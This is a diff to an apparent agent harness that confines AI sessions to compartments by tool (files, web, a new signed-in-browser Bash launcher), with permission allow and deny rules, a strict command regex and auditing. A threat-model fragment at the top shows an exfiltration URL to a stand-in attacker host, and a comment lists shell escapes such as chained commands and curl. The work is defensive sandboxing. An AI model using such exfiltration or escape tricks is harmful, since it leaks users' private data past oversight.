@@ -16,9 +16,14 @@ https://attacker/?d=<what you just read>") is enough. So code picks, per questio
 * **web**: ``WebSearch`` and ``WebFetch`` only. No file tool. Its brief carries the question's own words and the names in it
   and nothing else; when the question names an address, ``WebFetch`` is limited to that address's host.
 
-Nothing a private session read or returned is ever put into a web session's brief, in the same run or a later one. The
-person's signed-in browser (``api/harness_tools/read_browser.py``) is **not wired**: it is the next slice, its own
-compartment started by the app.
+Nothing a private session read or returned is ever put into a web session's brief, in the same run or a later one.
+
+A **third compartment, the person's signed-in browser** (``signed_in``; `harness_browse`), has its own session holding exactly one
+tool, ``Bash``, limited by a permission rule to one launcher that runs ``api/harness_tools/read_browser.py``: no search, no fetch, no
+file tool, no conversation copy. Its limits are the helper's code, from a grant only Cicada's code writes: only sites the person
+connected, only addresses that are given or a link of a page this run opened on the same host, reading only (never a click, a
+type or a download), only tabs it opened, a bounded number of opens, and only while the person's own browser-harness daemon is
+already running. What it returns goes to Cicada's code as evidence items and nowhere else.
 
 **What of the person's files it may read** is `harness_files`: granted folders chosen by what they are (never a secrets folder, a
 tooling folder or one of Cicada's own), and inside them only document kinds, enforced as the exact complement over a complete
@@ -84,8 +89,13 @@ TRANSCRIPT_KEEP = 200000  # the whole stream's text, in memory only, so a test o
 
 PRIVATE = "private"
 WEB = "web"
-#: The tools each compartment holds, exactly (``system/init`` must list these and no others, bar the answer's own tool).
-COMPARTMENT_TOOLS = {PRIVATE: frozenset({"Read", "Glob", "Grep"}), WEB: frozenset({"WebSearch", "WebFetch"})}
+SIGNED_IN = "signed_in"
+#: The tools each compartment holds, exactly (``system/init`` must list these and no others, bar the answer's own tool). The signed-in
+#: compartment's one tool is ``Bash`` and a permission rule limits it to its launcher (:func:`settings_for`).
+COMPARTMENT_TOOLS = {PRIVATE: frozenset({"Read", "Glob", "Grep"}), WEB: frozenset({"WebSearch", "WebFetch"}),
+                     SIGNED_IN: frozenset({"Bash"})}
+#: The helper's verbs a session may run.
+BROWSE_VERBS = ("open", "text", "status", "close")
 ANSWER_TOOL = "StructuredOutput"
 
 #: Tools that exist in no compartment: refused by name as well as never offered.
@@ -120,6 +130,7 @@ class Policy:
     refused: tuple[str, ...] = ()        # private: folders they may not read (the bank, Cicada's home)
     deny: tuple[str, ...] = ()           # private: the Grant's root-independent deny rules (the kinds that are not documents)
     domains: tuple[str, ...] = ()        # web: when set, ``WebFetch`` reaches only these hosts
+    browse: str = ""                     # signed_in: the launcher the one ``Bash`` rule names (an absolute path)
 
 
 def _rule(tool: str, path: str, pattern: str = "**") -> str:
@@ -145,6 +156,13 @@ def settings_for(policy: Policy) -> dict:
     each compartment denies the other's tools by name besides never being offered them. Only ``Read`` rules are written for the
     file tools: ``Glob`` and ``Grep`` follow them (a rule named for either is not consulted: proved live, battery ``canaries``)."""
     never = list(NEVER)
+    if policy.compartment == SIGNED_IN:
+        # The one allowed command is the launcher with one of its verbs. Anything else Bash could run (a second command after `;`, `&&`
+        # or a pipe, a substitution, a variable set first, a redirect, `curl`) is refused at once: proved live (battery `bash_rule`).
+        allow = [f"Bash({policy.browse} open:*)", f"Bash({policy.browse} text:*)", f"Bash({policy.browse} status)",
+                 f"Bash({policy.browse} close)"]
+        deny = [*[n for n in never if n != "Bash"], "WebSearch", "WebFetch", "Read", "Glob", "Grep"]
+        return {"permissions": {"allow": allow, "deny": deny}}
     if policy.compartment == WEB:
         allow = ["WebSearch", *([f"WebFetch(domain:{h})" for h in policy.domains] or ["WebFetch"])]
         deny = [*never, "Read", "Glob", "Grep"]
@@ -158,7 +176,7 @@ def settings_for(policy: Policy) -> dict:
 
 
 def tools_for(policy: Policy) -> str:
-    return ",".join(sorted(COMPARTMENT_TOOLS[policy.compartment], key=("Read", "Glob", "Grep", "WebSearch", "WebFetch").index))
+    return ",".join(sorted(COMPARTMENT_TOOLS[policy.compartment], key=("Read", "Glob", "Grep", "WebSearch", "WebFetch", "Bash").index))
 
 
 def build_argv(*, model: str, system_prompt: str, policy: Policy, binary: str = "claude",
@@ -200,9 +218,12 @@ class Call:
     result: str = ""   # kept in memory to locate a quote; never stored
     denied: bool = False
     error: bool = False
+    #: A page read in the signed-in browser: how its address was reached (``source``, ``search`` or ``followed``), read from the helper's own frame.
+    how: str = ""
 
     def line(self) -> dict:
-        return {"tool": self.kind, "what": self.what[:300], **({"denied": True} if self.denied else {})}
+        return {"tool": self.kind, "what": self.what[:300], **({"how": self.how} if self.how else {}),
+                **({"denied": True} if self.denied else {})}
 
 
 @dataclass
@@ -222,6 +243,10 @@ class Session:
     transcript: list[str] = field(default_factory=list)
     #: What the session scanned: files opened, bytes read, granted folders touched, and what the harness refused.
     scan: dict = field(default_factory=dict)
+    #: A signed-in session: the helper's own record of the addresses it opened, in order (``{url, host, how}``).
+    opened: list = field(default_factory=list)
+    #: A signed-in session: the name of the browser-harness daemon that answered (said in the stored audit).
+    daemon: str = ""
 
     @property
     def audit(self) -> list[dict]:
@@ -236,8 +261,12 @@ class Session:
 STOPPED_WORDS = {"timeout": "took too long", "too_many_calls": "made too many calls", "no_binary": "the tool is not installed",
                  "failed": "the session failed", "unexpected_tools": "the session held tools it was not given",
                  "no_init": "the session did not say what tools it held",
-                 "scan_limit": "the session searched more than one question may"}
+                 "scan_limit": "the session searched more than one question may",
+                 "no_browser": "the person's own browser is not running or not reachable, so the signed-in browser was not used"}
 
+#: A non-zero exit reaches the session as ``Exit code N`` and then the helper's own line: a refusal is that line.
+_HELPER_REFUSED = re.compile(r"^(?:Exit code \d+\n)?refused:")
+_OPENED_AS = re.compile(r"^OPENED AS: (source|search|followed)$", re.M)
 _DENIED = re.compile(r"permission to \w+ .* has been denied|has been denied|don't ask mode|was denied|not allowed|"
                      r"denied by your permission", re.I)
 
@@ -252,7 +281,27 @@ def classify(name: str, inp: dict) -> tuple[str, str]:
         return "search", str(inp.get("query") or "")
     if name == "WebFetch":
         return "address", str(inp.get("url") or "")
+    if name == "Bash":
+        verb = browse_command(str(inp.get("command") or ""))
+        if verb:
+            return ("page", verb[1]) if verb[0] in ("open", "text") else ("page_ctl", verb[0])
     return "shell", str(name)[:200]
+
+
+#: The one shape of command that is a page read: the launcher (`.../rb`), a verb, and at most one argument that is a quoted string or a bare word
+#: with no shell metacharacter in it. Anything with a second command, a substitution, a redirect or a variable in front is not this shape.
+_BROWSE_COMMAND = re.compile(r"""^(?P<launcher>/\S*/rb) (?P<verb>open|text|status|close)(?: (?:'(?P<q1>[^']*)'|"(?P<q2>[^"$`\\]*)"|(?P<bare>[^\s;&|<>$`()'"\\]+)))?$""")
+
+
+def browse_command(command: str) -> tuple[str, str] | None:
+    """``(verb, what)`` when ``command`` is the browser launcher with one of its verbs (``.../rb open '<address>'``), else ``None``. The
+    permission rule is what makes it the only command that runs; this only decides how a call is shown in the audit."""
+    m = _BROWSE_COMMAND.match(command.strip())
+    if not m:
+        return None
+    arg = next((g for g in (m.group("q1"), m.group("q2"), m.group("bare")) if g is not None), "")
+    verb = m.group("verb")
+    return verb, (arg if verb == "open" else (f"text {arg}" if verb == "text" else ""))
 
 
 def _text_of(content) -> str:
@@ -327,6 +376,19 @@ def register_scratch(path: Path) -> Path | None:
         return None
 
 
+def register_browse(setup) -> Path | None:
+    """Record a signed-in session's browser files (its grant, its state, where its harness lives) with the backend that made them, so the
+    next start closes the tabs a dead backend left open, before it removes the folder they are in."""
+    try:
+        rec = _registry() / f"browse-{Path(setup.state).parent.name}.json"
+        rec.write_text(json.dumps({"browse": {"launcher": setup.launcher, "grant": setup.grant, "state": setup.state,
+                                              "env": setup.harness_env},
+                                   "owner": os.getpid(), "owner_cmd": _command_of(os.getpid())[:200], "at": time.time()}), encoding="utf-8")
+        return rec
+    except OSError:
+        return None
+
+
 def remove_scratch(path: Path, record: Path | None) -> None:
     shutil.rmtree(path, ignore_errors=True)
     if record is not None:
@@ -341,7 +403,7 @@ def reap_orphans() -> int:
     ``cicada-harness-*`` whose owner is gone. Never raises."""
     killed = 0
     try:
-        files = list(_registry().glob("*.json"))
+        files = sorted(_registry().glob("*.json"), key=lambda p: not p.name.startswith("browse-"))   # tabs first: they need the folder
     except OSError:
         return 0
     for f in files:
@@ -355,6 +417,17 @@ def reap_orphans() -> int:
         if owner == os.getpid():
             continue
         owner_live = _command_of(owner) and _command_of(owner)[:200] == str(rec.get("owner_cmd") or "")
+        if "browse" in rec:
+            if not owner_live:
+                try:
+                    from api.services import harness_browse
+
+                    b = rec["browse"]
+                    harness_browse.close_tabs(harness_browse.Setup(str(b["launcher"]), str(b["grant"]), str(b["state"]), dict(b.get("env") or {})))
+                except Exception as exc:  # noqa: BLE001 - a reaper never raises
+                    logger.info(f"harness reaper: tabs not closed ({type(exc).__name__})")
+                f.unlink(missing_ok=True)
+            continue
         if "scratch" in rec:
             if not owner_live:
                 path = Path(str(rec.get("scratch") or ""))
@@ -492,6 +565,10 @@ def run(argv: list[str], prompt: str, *, cwd: str, env: dict[str, str], timeout:
                             call.result = text[:RESULT_KEEP]
                             call.error = bool(block.get("is_error"))
                             call.denied = bool(_DENIED.search(text[:300])) and (call.error or "denied" in text[:300].lower())
+                            if call.kind in ("page", "page_ctl"):
+                                call.denied = call.denied or bool(_HELPER_REFUSED.match(text))     # the helper's own refusal counts as one
+                                m = _OPENED_AS.search(text[:400])
+                                call.how = m.group(1) if m else ""
             elif kind == "result":
                 session.answer = _answer_of(event)
                 keep(str(event.get("result") or ""))
@@ -581,6 +658,12 @@ def read_text(call: "Call") -> str:
     return _NUMBERED.sub("", call.result)
 
 
+def page_text(call: "Call") -> str:
+    """The page's own text in a helper frame (``<<<PAGE`` ... ``>>>PAGE``), without the address, title, verdict or link lists."""
+    m = re.search(r"<<<PAGE\n(.*)\n>>>PAGE", call.result, re.S)
+    return m.group(1) if m else ""
+
+
 @dataclass
 class Evidence:
     where: str
@@ -590,6 +673,8 @@ class Evidence:
     #: Where it was found: the whole text of a ``Read`` (a quote's turn can be known) or one line a search printed (it cannot).
     text: str = field(default="", repr=False, compare=False)
     whole: bool = field(default=False, repr=False, compare=False)
+    #: A page read in the signed-in browser: how its address was reached (source, search, followed), from the helper's frame.
+    origin: str = field(default="", compare=False)
 
 
 def verify(answer: dict | None, session: Session, min_confidence: float = MIN_CONFIDENCE) -> tuple[list[Evidence], str]:
@@ -621,6 +706,14 @@ def verify(answer: dict | None, session: Session, min_confidence: float = MIN_CO
                 if span:
                     out.append(Evidence(where, "address", span, side, call.result, True))
                     break
+            elif call.kind == "page" and call.result.startswith("ADDRESS: "):
+                shown = call.result.split("\n", 1)[0][len("ADDRESS: "):].strip()
+                if _same_address(where, shown) or _same_address(where, call.what):
+                    text = page_text(call)          # the page's own text only: never the helper's header, links or a refusal
+                    span = source_span(quote, text)
+                    if span:
+                        out.append(Evidence(shown, "address", span, side, text, True, call.how))
+                        break
             elif call.kind == "file" and _names_file(where, call.what):
                 text = read_text(call)
                 span = source_span(quote, text)
